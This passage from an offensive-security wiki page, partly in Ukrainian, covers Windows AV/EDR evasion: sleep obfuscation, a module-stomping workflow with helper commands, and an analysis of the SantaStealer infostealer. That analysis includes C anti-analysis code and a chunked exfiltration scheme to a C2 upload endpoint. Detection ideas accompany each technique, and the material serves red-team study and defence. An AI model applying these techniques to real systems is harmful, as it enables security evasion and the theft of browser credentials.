- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`) to invoke each step.

Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
- Large-range `VirtualProtect` followed by custom per-section permission restoration.


## Precision Module Stomping

Module stomping виконує payloads з **`.text` section DLL, яка вже mapped всередині target process** замість allocation очевидної private executable memory або завантаження нової sacrificial DLL. Ціль overwrite має бути **loaded, disk-backed image**, чий code space може прийняти payload без пошкодження code paths, які процесу ще потрібні.

### Reliable target selection

Naive stomping проти common modules на кшталт `uxtheme.dll` або `comctl32.dll` є fragile: DLL може бути не завантажена у remote process, а занадто маленький code region призведе до crash процесу. Надійніший workflow:

1. Перелічіть modules target process і збережіть **names-only include list** DLL, які вже loaded.
2. Спочатку зберіть payload і зафіксуйте його **точний byte size**.
3. Скануйте candidate DLL на disk і порівнюйте PE section **`.text` `Misc_VirtualSize`** із payload size. Це важливіше за file size, бо відображає розмір executable section **під час mapping in memory**.
4. Parse **Export Address Table (EAT)** і виберіть exported function RVA як stomp start offset.
5. Обчисліть **blast radius**: якщо payload перевищує обраний function boundary, він перезапише сусідні exports, розташовані після нього в memory.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Операційні нотатки
- Надавайте перевагу DLLs, **already loaded** у віддаленому процесі, щоб уникнути телеметрії `LoadLibrary`/unexpected image loads.
- Надавайте перевагу export, які рідко виконуються цільовою application, інакше normal code paths можуть досягти stomped bytes до або після thread creation.
- Великі implants часто вимагають зміни shellcode embedding зі string literal на **byte-array/braced initializer**, щоб весь буфер був коректно представлений у source інжектора.

Ідеї для detection
- Remote writes у **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) замість більш поширених private RWX/RX allocations.
- Export entry points, чиї in-memory bytes більше не збігаються з backing file on disk.
- Remote threads або context pivots, що починають execution всередині legitimate DLL export, перші bytes якого нещодавно були modified.
- Підозрілі `VirtualProtect(Ex)` / `WriteProcessMemory` sequences проти DLL `.text` pages, за якими слідує thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ілюструє, як modern info-stealers поєднують AV bypass, anti-analysis і credential access в одному workflow.

### Keyboard layout gating & sandbox delay

- Config flag (`anti_cis`) перелічує встановлені keyboard layouts через `GetKeyboardLayoutList`. Якщо знайдено Cyrillic layout, sample скидає порожній `CIS` marker і завершується перед запуском stealers, гарантуючи, що він ніколи не спрацює на excluded locales, водночас залишаючи hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Шарована логіка `check_antivm`

- Варіант A проходить список процесів, хешує кожну назву за допомогою custom rolling checksum і порівнює її з вбудованими blocklists для дебагерів/sandboxes; він повторює checksum для імені комп'ютера та перевіряє робочі каталоги, такі як `C:\analysis`.
- Варіант B перевіряє системні властивості (поріг кількості процесів, recent uptime), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує timing checks навколо sleeps, щоб виявити single-stepping. Будь-яке спрацювання aborts before modules launch.

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE вбудовує Chromium credential helper, який або скидається на диск, або вручну mapped in-memory; fileless mode самостійно розв'язує imports/relocations, тож жодних helper artifacts не записується.
- Цей helper зберігає second-stage DLL, зашифрований двічі за допомогою ChaCha20 (дві 32-byte keys + 12-byte nonces). Після обох проходів він reflectively loads blob (без `LoadLibrary`) і викликає exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Рутини ChromElevator використовують direct-syscall reflective process hollowing для ін'єкції в live Chromium browser, успадковують AppBound Encryption keys і розшифровують passwords/cookies/credit cards прямо з SQLite databases попри hardening ABE.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` ітерує глобальну `memory_generators` function-pointer table і запускає по одному thread на кожен увімкнений module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Кожен thread записує результати у shared buffers і повідомляє свій file count після ~45s join window.
- Після завершення все zip'иться зі statically linked бібліотекою `miniz` як `%TEMP%\\Log.zip`. Потім `ThreadPayload1` спить 15s і передає archive у chunks по 10 MB через HTTP POST на `http://<C2>:6767/upload`, spoofing browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Кожен chunk додає `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, а останній chunk додає `complete: true`, щоб C2 знав, що reassembly завершено.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
